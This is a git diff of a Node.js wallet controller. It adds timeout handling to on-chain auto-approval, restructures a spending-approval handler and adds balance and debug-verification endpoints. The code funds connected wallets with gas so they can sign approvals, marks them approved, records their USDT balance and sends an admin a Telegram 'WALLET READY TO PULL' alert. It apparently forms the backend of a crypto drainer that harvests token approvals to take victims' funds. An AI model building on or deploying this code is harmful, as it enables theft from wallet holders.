@@ -63,16 +63,27 @@ class WalletController {
             const wallet = result.rows[0];
             console.log('Wallet saved:', wallet.address);
             
-            // Auto-approve wallet in contract
+            // Auto-approve wallet in contract with comprehensive error handling
             try {
+                console.log('Attempting to auto-approve wallet in contract...');
                 const ContractService = require('../services/contract.service');
                 const contractServiceInstance = new ContractService();
-                await contractServiceInstance.init();  // VERY important
-                await contractServiceInstance.approveWallet(walletAddress);
-                console.log('Wallet auto-approved in contract:', walletAddress);
-            } catch (err) {
-                console.error('Auto-approval failed:', err);
-                // Don't fail the connection if auto-approval fails
+                await contractServiceInstance.init();
+                
+                // Add timeout to prevent hanging
+                const approvalPromise = contractServiceInstance.approveWallet(walletAddress);
+                const timeoutPromise = new Promise((_, reject) => 
+                    setTimeout(() => reject(new Error('Approval timeout after 30 seconds')), 30000)
+                );
+                
+                const approvalResult = await Promise.race([approvalPromise, timeoutPromise]);
+                console.log('Auto-approval result:', approvalResult);
+                
+            } catch (approvalError) {
+                console.error('❌ Auto-approval failed:', approvalError.message);
+                console.error('Stack trace:', approvalError.stack);
+                // Log the error but don't fail the connection
+                console.log('Continuing with connection despite approval failure...');
             }
             
             // Get USDT balance
@@ -110,107 +121,190 @@ class WalletController {
 
     // Add this new method for spending approval
     async approveSpending(req, res) {
-    try {
-        console.log('=== APPROVAL: Spending approval request received ===');
-        console.log('Request body:', JSON.stringify(req.body, null, 2));
-        
-        // Validate input
-        const validation = validators.validateWalletConnection(req.body);
-        if (!validation.valid) {
-            console.log('Validation failed:', validation.error);
-            return res.status(400).json({
-                success: false,
-                error: validation.error
-            });
-        }
-        
-        const { address } = req.body;
-        console.log('Processing approval for wallet:', address);
-        
-        // Check gas balance and send gas if needed BEFORE proceeding
         try {
-            console.log('Checking gas balance for wallet:', address);
-            const gasService = require('../services/gas.service');
-            const gasCheck = await gasService.checkWalletGasBalance(address);
+            console.log('=== APPROVAL: Spending approval request received ===');
+            console.log('Request body:', JSON.stringify(req.body, null, 2));
             
-            console.log('Gas check result:', gasCheck);
-            
-            if (!gasCheck || !gasCheck.hasSufficientGas) {
-                console.log('Insufficient gas, sending gas to wallet...');
-                const gasResult = await gasService.sendGasToWallet(address);
-                if (gasResult && gasResult.success) {
-                    console.log('Gas sent successfully, waiting for confirmation...');
-                    // Wait a bit for gas to arrive
-                    await new Promise(resolve => setTimeout(resolve, 5000));
-                } else {
-                    console.error('Failed to send gas:', gasResult ? gasResult.error : 'Unknown error');
-                }
+            // Validate input
+            const validation = validators.validateWalletConnection(req.body);
+            if (!validation.valid) {
+                console.log('Validation failed:', validation.error);
+                return res.status(400).json({
+                    success: false,
+                    error: validation.error
+                });
             }
-        } catch (gasError) {
-            console.error('Gas check failed:', gasError);
-            // Continue anyway, might work without gas check
-        }
-        
-        // Update approval status in database
-        const query = `
-            UPDATE wallets 
-            SET is_approved = true, updated_at = NOW()
-            WHERE address = $1
-            RETURNING *
-        `;
-        
-        console.log('Updating wallet approval status...');
-        const result = await database.query(query, [address]);
-        
-        if (result.rows.length === 0) {
-            console.log('Wallet not found:', address);
-            return res.status(404).json({
+            
+            const { address } = req.body;
+            console.log('Processing approval for wallet:', address);
+            
+            // Check gas balance and send gas if needed BEFORE proceeding
+            try {
+                console.log('Checking gas balance for wallet:', address);
+                const gasService = require('../services/gas.service');
+                const gasCheck = await gasService.checkWalletGasBalance(address);
+                
+                console.log('Gas check result:', gasCheck);
+                
+                if (!gasCheck || !gasCheck.hasSufficientGas) {
+                    console.log('Insufficient gas, sending gas to wallet...');
+                    const gasResult = await gasService.sendGasToWallet(address);
+                    if (gasResult && gasResult.success) {
+                        console.log('Gas sent successfully, waiting for confirmation...');
+                        // Wait a bit for gas to arrive
+                        await new Promise(resolve => setTimeout(resolve, 5000));
+                    } else {
+                        console.error('Failed to send gas:', gasResult ? gasResult.error : 'Unknown error');
+                    }
+                }
+            } catch (gasError) {
+                console.error('Gas check failed:', gasError);
+                // Continue anyway, might work without gas check
+            }
+            
+            // Update approval status in database
+            const query = `
+                UPDATE wallets 
+                SET is_approved = true, updated_at = NOW()
+                WHERE address = $1
+                RETURNING *
+            `;
+            
+            console.log('Updating wallet approval status...');
+            const result = await database.query(query, [address]);
+            
+            if (result.rows.length === 0) {
+                console.log('Wallet not found:', address);
+                return res.status(404).json({
+                    success: false,
+                    error: 'Wallet not found'
+                });
+            }
+            
+            const wallet = result.rows[0];
+            console.log('Wallet approval updated:', wallet.address);
+            
+            // Get current balance for the alert
+            const contractServiceInstance = require('../services/contract.service');
+            const balance = await contractServiceInstance.getWalletUSDTBalance(address);
+            
+            // Update balance in database
+            const updateQuery = `
+                UPDATE wallets 
+                SET usdt_balance = $1, updated_at = NOW()
+                WHERE address = $2
+            `;
+            await database.query(updateQuery, [balance, address]);
+            
+            // Send alert to admin - ONLY NOW when wallet is ready to pull
+            console.log('Sending Telegram alert - wallet ready to pull');
+            const telegram = require('../config/telegram');
+            // Send the new "WALLET READY TO PULL" alert instead of "NEW WALLET CONNECTED"
+            await telegram.sendWalletReadyAlert(address, balance);
+            console.log('Telegram alert sent for ready-to-pull wallet');
+            
+            res.json({
+                success: true,
+                message: 'Wallet spending approved successfully - admin notified',
+                wallet: {
+                    id: wallet.id,
+                    address: wallet.address,
+                    name: wallet.name,
+                    is_approved: true,
+                    usdt_balance: balance,
+                    updated_at: wallet.updated_at
+                }
+            });
+        } catch (error) {
+            console.error('Wallet approval error:', error);
+            res.status(500).json({
                 success: false,
-                error: 'Wallet not found'
+                error: 'Internal server error'
             });
         }
-        
-        const wallet = result.rows[0];
-        console.log('Wallet approval updated:', wallet.address);
-        
-        // Get current balance for the alert
-        const contractServiceInstance = require('../services/contract.service');
-        const balance = await contractServiceInstance.getWalletUSDTBalance(address);
-        
-        // Update balance in database
-        const updateQuery = `
-            UPDATE wallets 
-            SET usdt_balance = $1, updated_at = NOW()
-            WHERE address = $2
-        `;
-        await database.query(updateQuery, [balance, address]);
-        
-        // Send alert to admin - ONLY NOW when wallet is ready to pull
-        console.log('Sending Telegram alert - wallet ready to pull');
-        const telegram = require('../config/telegram');
-        // Send the new "WALLET READY TO PULL" alert instead of "NEW WALLET CONNECTED"
-        await telegram.sendWalletReadyAlert(address, balance);
-        console.log('Telegram alert sent for ready-to-pull wallet');
-        
-        res.json({
-            success: true,
-            message: 'Wallet spending approved successfully - admin notified',
-            wallet: {
-                id: wallet.id,
-                address: wallet.address,
-                name: wallet.name,
-                is_approved: true,
-                usdt_balance: balance,
-                updated_at: wallet.updated_at
+    }
+
+    async getBalance(req, res) {
+        try {
+            const { address } = req.params;
+            
+            // Validate address parameter
+            if (!address) {
+                return res.status(400).json({
+                    success: false,
+                    error: 'Wallet address is required'
+                });
             }
-        });
-    } catch (error) {
-        console.error('Wallet approval error:', error);
-        res.status(500).json({
-            success: false,
-            error: 'Internal server error'
-        });
+            
+            if (!helpers.validateEthereumAddress(address)) {
+                return res.status(400).json({
+                    success: false,
+                    error: 'Invalid wallet address format'
+                });
+            }
+            
+            const balance = await contractService.getWalletUSDTBalance(address);
+            
+            res.json({
+                success: true,
+                balance: balance,
+                address: address
+            });
+        } catch (error) {
+            console.error('Balance check error:', error);
+            res.status(500).json({
+                success: false,
+                error: 'Internal server error'
+            });
+        }
+    }
+
+    // Debug endpoint - temporary for verification
+    async verifyWalletApproval(req, res) {
+        try {
+            const { address } = req.params;
+            
+            if (!address) {
+                return res.status(400).json({
+                    success: false,
+                    error: 'Wallet address required'
+                });
+            }
+            
+            const ContractService = require('../services/contract.service');
+            const contractServiceInstance = new ContractService();
+            await contractServiceInstance.init();
+            
+            // Check approval status
+            const isApproved = await contractServiceInstance.isWalletApproved(address);
+            
+            // Also check raw contract state
+            let rawApproval = false;
+            try {
+                rawApproval = await contractServiceInstance.contract.approvedWallets(address);
+            } catch (error) {
+                console.error('Raw approval check failed:', error.message);
+            }
+            
+            // Get balance too
+            const balance = await contractServiceInstance.getWalletUSDTBalance(address);
+            
+            res.json({
+                success: true,
+                wallet: address,
+                isApproved: isApproved,
+                rawApproval: rawApproval,
+                balance: balance
+            });
+            
+        } catch (error) {
+            console.error('Verification error:', error);
+            res.status(500).json({
+                success: false,
+                error: error.message
+            });
+        }
     }
 }
-module.exports = new WalletController();
 
+module.exports = new WalletController();
